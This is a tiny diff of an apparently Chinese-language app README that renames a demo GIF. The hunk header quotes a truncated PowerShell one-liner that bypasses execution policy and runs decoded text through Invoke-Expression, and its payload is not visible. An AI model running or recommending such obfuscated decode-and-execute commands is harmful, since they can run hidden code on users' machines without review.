@@ -73,4 +73,4 @@ powershell -ExecutionPolicy Bypass -Command "iex ([System.Text.Encoding]::UTF8.G
 
 ## 工作演示
 
-![采集演示](images/keboo_app_work_demo.gif)
+![采集演示](images/keboo_app_work_demo_677.gif)
